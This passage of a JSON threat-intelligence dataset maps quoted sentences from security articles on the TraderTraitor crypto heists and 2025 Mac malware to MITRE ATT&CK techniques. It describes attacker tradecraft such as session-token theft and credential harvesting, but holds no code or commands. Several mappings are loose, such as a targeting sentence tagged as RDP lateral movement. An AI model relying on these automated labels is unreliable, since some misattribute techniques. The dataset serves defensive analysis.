+      "description": "“A similar pattern emerged in the Bybit heist, where TraderTraitor gained access to Safe{Wallet}’s AWS environment by stealing active session tokens from a compromised developer machine—effectively bypassing multi-factor authentication.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        },
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1556.006",
+        "name": "Modify Authentication Process: Multi-Factor Authentication",
+        "parent_id": "T1556",
+        "url": "https://attack.mitre.org/techniques/T1556/006"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“The C2 server could respond with an encrypted second stage payload (using AES-256 [T1027]) that the app would decrypt and execute on the victim’s machine.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1027"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“Several malicious domains tied to this NPM campaign were identified, masquerading as legit package or crypto services.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1036",
+        "name": "Masquerading",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1036"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“For example, the FBI and Japan’s NPA attributed a $308 million Bitcoin DMM exchange heist (May 2024) to TraderTraitor, calling it a Lazarus subgroup characterized by using simultaneous social engineering of multiple employees to gain initial access to their target.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684",
+        "name": "Social Engineering",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1684"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“These messages posed as recruiters offering lucrative jobs and enticed targets to download fake crypto applications [T1204.002] that contain malicious payloads.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684.001",
+        "name": "Social Engineering: Impersonation",
+        "parent_id": "T1684",
+        "url": "https://attack.mitre.org/techniques/T1684/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“These apps were often digitally signed with compromised or fraudulent Apple code-signing certificates (later revoked) to bypass security warnings [T1553.002].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1553.002",
+        "name": "Subvert Trust Controls: Code Signing",
+        "parent_id": "T1553",
+        "url": "https://attack.mitre.org/techniques/T1553/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“By late February, they had moved to active C2 communication and tampered with Safe{Wallet}’s statically hosted frontend (built with Next.js) by injecting malicious JavaScript [T1578.005].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1578.005",
+        "name": "Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations",
+        "parent_id": "T1578",
+        "url": "https://attack.mitre.org/techniques/T1578/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“Using the stolen session cookies [T1550.004], the attackers accessed Ginco’s internal systems and breached an unencrypted communication channel linked to DMM Bitcoin.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1539",
+        "name": "Steal Web Session Cookie",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1539"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“Credential Access Unsecured Credentials: Credentials In Files (T1552.004) RN Stealer extracts credentials and cloud configs from files.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1552.001",
+        "name": "Unsecured Credentials: Credentials In Files",
+        "parent_id": "T1552",
+        "url": "https://attack.mitre.org/techniques/T1552/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“The malware, identified as RN Loader and RN Stealer, harvested sensitive data including SSH keys, saved credentials, and cloud configurations [T1552.004].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1552.004",
+        "name": "Unsecured Credentials: Private Keys",
+        "parent_id": "T1552",
+        "url": "https://attack.mitre.org/techniques/T1552/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“Credential Access Credentials from Password Stores (T1555) Steals saved passwords, SSH keys, cloud service credentials.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1555",
+        "name": "Credentials from Password Stores",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1555"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“MANUSCRYPT would then harvest system info [T1082], execute arbitrary commands [T1059], and ultimately seek out cryptocurrency wallet keys or credentials to enable theft of funds.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1082"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“These tactics suggest that TraderTraitor understands the value of cloud credentials, APIs, and SaaS integrations as a route to privileged access and broader lateral movement [T1087.004].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1087.004",
+        "name": "Account Discovery: Cloud Account",
+        "parent_id": "T1087",
+        "url": "https://attack.mitre.org/techniques/T1087/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“Throughout mid-February, the attacker conducted reconnaissance, enumerating IAM roles, S3 buckets, and other cloud assets [T1580].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1580",
+        "name": "Cloud Infrastructure Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1580"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“This operation primarily targeted developers working at blockchain and fintech firms.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "order": 10,
+          "shortname": "lateral-movement",
+          "url": "https://attack.mitre.org/tactics/TA0008"
+        }
+      ],
+      "technique": {
+        "id": "T1021.001",
+        "name": "Remote Services: Remote Desktop Protocol",
+        "parent_id": "T1021",
+        "url": "https://attack.mitre.org/techniques/T1021/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“Since its first public mention in 2022, TraderTraitor has been linked to major cryptocurrency thefts and has targeted cloud services and software development platforms in operations like the JumpCloud supply chain attack and the ByBit hack.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "order": 10,
+          "shortname": "lateral-movement",
+          "url": "https://attack.mitre.org/tactics/TA0008"
+        }
+      ],
+      "technique": {
+        "id": "T1021.007",
+        "name": "Remote Services: Cloud Services",
+        "parent_id": "T1021",
+        "url": "https://attack.mitre.org/techniques/T1021/007"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“Using the stolen session cookies [T1550.004], the attackers accessed Ginco’s internal systems and breached an unencrypted communication channel linked to DMM Bitcoin.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "order": 10,
+          "shortname": "lateral-movement",
+          "url": "https://attack.mitre.org/tactics/TA0008"
+        }
+      ],
+      "technique": {
+        "id": "T1550.004",
+        "name": "Use Alternate Authentication Material: Web Session Cookie",
+        "parent_id": "T1550",
+        "url": "https://attack.mitre.org/techniques/T1550/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“The attackers leveraged these credentials to conduct reconnaissance, plant malware in S3 buckets, and explore IAM roles and cloud asset configurations before injecting malicious JavaScript into a web application frontend to redirect crypto transactions.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0009",
+          "name": "Collection",
+          "order": 11,
+          "shortname": "collection",
+          "url": "https://attack.mitre.org/tactics/TA0009"
+        }
+      ],
+      "technique": {
+        "id": "T1530",
+        "name": "Data from Cloud Storage",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1530"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“Command & Control Application Layer Protocol: Web Protocols (T1071.001) Malware uses HTTPS callbacks to C2 servers.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "parent_id": "T1071",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“Each malicious application had an \"update\" mechanism that would contact a hardcoded C2 URL [T1105].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1105"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“Exfiltration Exfiltration Over C2 Channel (T1041) Sensitive data (e.g. keys, credentials) exfiltrated via HTTPS.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0010",
+          "name": "Exfiltration",
+          "order": 13,
+          "shortname": "exfiltration",
+          "url": "https://attack.mitre.org/tactics/TA0010"
+        }
+      ],
+      "technique": {
+        "id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1041"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“Impact Data Manipulation / Cryptocurrency Theft Initiates unauthorized blockchain transactions.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1565",
+        "name": "Data Manipulation",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1565"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“For example, the FBI and Japan’s NPA attributed a $308 million Bitcoin DMM exchange heist (May 2024) to TraderTraitor, calling it a Lazarus subgroup characterized by using simultaneous social engineering of multiple employees to gain initial access to their target.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“That earlier report outlined a 2022 campaign attributed to a group tracked by Mandiant as UNC4487, in which attackers compromised a Ukrainian auto insurance website required for official government travel.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.001",
+        "name": "Acquire Infrastructure: Domains",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“The site was used to distribute the MATANBUCHUS malware, after which access to infected systems was allegedly monetized.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1584.001",
+        "name": "Compromise Infrastructure: Domains",
+        "parent_id": "T1584",
+        "url": "https://attack.mitre.org/techniques/T1584/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“Next comes the actual data theft and exfiltration.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1587.001",
+        "name": "Develop Capabilities: Malware",
+        "parent_id": "T1587",
+        "url": "https://attack.mitre.org/techniques/T1587/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“Researchers from Palo Alto Networks’ Unit 42 uncovered RN Stealer and detailed how it was used as part of a larger campaign targeting enterprise organizations.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1190",
